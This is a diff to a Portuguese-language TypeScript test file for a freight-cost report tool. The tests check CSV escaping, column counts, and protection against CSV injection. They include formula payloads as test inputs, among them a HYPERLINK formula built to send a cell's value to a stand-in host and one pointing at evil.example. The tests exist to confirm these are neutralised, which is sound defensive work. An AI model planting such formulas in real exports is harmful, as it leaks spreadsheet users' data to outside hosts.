@@ -8,6 +8,7 @@ alcanceCarregado,
   MAX_PAGINAS,
   buscarTodasPaginas,
   calcularDerivadosPorCte,
+  celulaCsv,
   deduplicarPorCteNf,
   calcularResumo,
   classificarFaixaFrete,
@@ -21,6 +22,8 @@ alcanceCarregado,
   formatarNumero,
   formatarPercentual,
   freteCte,
+  montarCsvRelatorio,
+  nomeArquivoCsv,
    resumoOrdensDespacho,
   freteSobreMercadoria,
   isoParaData,
@@ -1287,6 +1290,141 @@ describe("calcularResumo com CT-e de várias NF-e", () => {
   })
 })
 
+
+describe("celulaCsv", () => {
+  it("sempre coloca entre aspas, porque o delimitador é vírgula", () => {
+    expect(celulaCsv("ALFA DO BRASIL")).toBe('"ALFA DO BRASIL"')
+    expect(celulaCsv(710)).toBe('"710"')
+    expect(celulaCsv(null)).toBe('""')
+    expect(celulaCsv(undefined)).toBe('""')
+  })
+
+  it("mantém vírgula de dentro do texto na mesma coluna", () => {
+    expect(celulaCsv("TECIDO, MALHA 100% ALGODÃO")).toBe('"TECIDO, MALHA 100% ALGODÃO"')
+  })
+
+  it("dobra as aspas internas", () => {
+    expect(celulaCsv('AO "QUARTO"')).toBe('"AO ""QUARTO"""')
+  })
+
+  it("preserva a quebra de linha dentro da célula", () => {
+    expect(celulaCsv("linha 1\nlinha 2")).toBe('"linha 1\nlinha 2"')
+  })
+
+  // CSV injection: valor começando com = + - @ vira fórmula no Excel/Sheets.
+  it("neutraliza fórmula no início da célula", () => {
+    expect(celulaCsv('=HYPERLINK("http://x/?d="&A1,"abrir")')).toBe(
+      '"\'=HYPERLINK(""http://x/?d=""&A1,""abrir"")"'
+    )
+    expect(celulaCsv("+1+1")).toBe('"\'+1+1"')
+    expect(celulaCsv("@SUM(A1)")).toBe('"\'@SUM(A1)"')
+    expect(celulaCsv("-2+3")).toBe('"\'-2+3"')
+    expect(celulaCsv("=1+1")).toBe('"\'=1+1"')
+  })
+
+  it("não neutraliza quando o símbolo não está no início", () => {
+    expect(celulaCsv("Frete = 1,5%")).toBe('"Frete = 1,5%"')
+    expect(celulaCsv("SAO PAULO")).toBe('"SAO PAULO"')
+  })
+
+  it("pega o risco mesmo com espaço antes do símbolo", () => {
+    expect(celulaCsv(" =1+1")).toBe('"\' =1+1"')
+  })
+})
+
+describe("montarCsvRelatorio", () => {
+  const comDescricao = linha({
+    cte_numero: 195481,
+    cte_serie: "1",
+    nf_numero: 35832,
+    nf_serie: "1",
+    nf_item_descricoes: "TECIDO, MALHA 100% ALGODÃO",
+    nf_od_cliente_fantasia: "=HYPERLINK(\"https://evil.example\")",
+    pct_cte_sobre_total_nfs: 1.7,
+  })
+
+  // Lê o CSV de verdade: split(",") quebraria justamente o caso que o teste
+  // existe para provar (vírgula dentro do texto staying na mesma coluna).
+  function campos(linha: string): string[] {
+    const saida: string[] = []
+    let atual = ""
+    let dentroDeAspas = false
+    for (let i = 0; i < linha.length; i++) {
+      const c = linha[i]
+      if (c === '"') {
+        if (dentroDeAspas && linha[i + 1] === '"') {
+          atual += '"'
+          i++
+        } else {
+          dentroDeAspas = !dentroDeAspas
+        }
+      } else if (c === "," && !dentroDeAspas) {
+        saida.push(atual)
+        atual = ""
+      } else {
+        atual += c
+      }
+    }
+    saida.push(atual)
+    return saida
+  }
+
+  it("começa com BOM e quebra linha com CRLF (Excel pt-BR)", () => {
+    const csv = montarCsvRelatorio([comDescricao])
+    expect(csv.charCodeAt(0)).toBe(0xfeff)
+    expect(csv).toContain("\r\n")
+  })
+
+  it("mantém a contagem de colunas mesmo com vírgula no texto", () => {
+    const linhas = montarCsvRelatorio([comDescricao]).replace("\uFEFF", "").split("\r\n")
+    expect(linhas).toHaveLength(2)
+    const cabecalho = campos(linhas[0])
+    const dados = campos(linhas[1])
+    expect(dados).toHaveLength(cabecalho.length)
+    expect(cabecalho[0]).toBe("CT-e")
+    expect(dados[0]).toBe("195481/1")
+  })
+
+  it("mantém a descrição de item com vírgula em uma coluna só", () => {
+    const linhas = montarCsvRelatorio([comDescricao]).replace("\uFEFF", "").split("\r\n")
+    const cabecalho = campos(linhas[0])
+    const dados = campos(linhas[1])
+    const colunaDescricao = cabecalho.indexOf("Itens (descricoes)")
+    expect(colunaDescricao).toBeGreaterThan(-1)
+    expect(dados[colunaDescricao]).toBe("TECIDO, MALHA 100% ALGODÃO")
+  })
+
+  it("leva a faixa de frete como rótulo, não como número", () => {
+    expect(montarCsvRelatorio([comDescricao])).toContain('"na faixa (1,5% a 2,0%)"')
+  })
+
+  it("protege o nome do cliente que vem do ERP", () => {
+    const linhas = montarCsvRelatorio([comDescricao]).replace("\uFEFF", "").split("\r\n")
+    const cabecalho = campos(linhas[0])
+    const dados = campos(linhas[1])
+    const coluna = cabecalho.indexOf("Cliente (despacho)")
+    expect(dados[coluna]).toBe("'=HYPERLINK(\"https://evil.example\")")
+  })
+
+  it("aceita recorte vazio e devolve só o cabeçalho", () => {
+    const csv = montarCsvRelatorio([])
+    expect(csv.replace("\uFEFF", "").split("\r\n")).toHaveLength(1)
+    expect(csv).toContain('"CT-e"')
+  })
+})
+
+describe("nomeArquivoCsv", () => {
+  it("usa o período carregado", () => {
+    expect(nomeArquivoCsv({ de: "2026-09-01", ate: "2026-09-30" })).toBe(
+      "nfe-cte_2026-09-01_a_2026-09-30.csv"
+    )
+  })
+
+  it("não deixa nome de arquivo com buraco quando a data está vazia", () => {
+    expect(nomeArquivoCsv({ de: "", ate: "" })).toBe("nfe-cte_inicio_a_fim.csv")
+    expect(nomeArquivoCsv({ de: "2026-09-01", ate: "" })).toBe("nfe-cte_2026-09-01_a_fim.csv")
+  })
+})
 
 describe("agruparOrdensDespacho", () => {
   // Medido no endpoint em 03/10/2026 (janela de 12 meses, 907 NF-e com
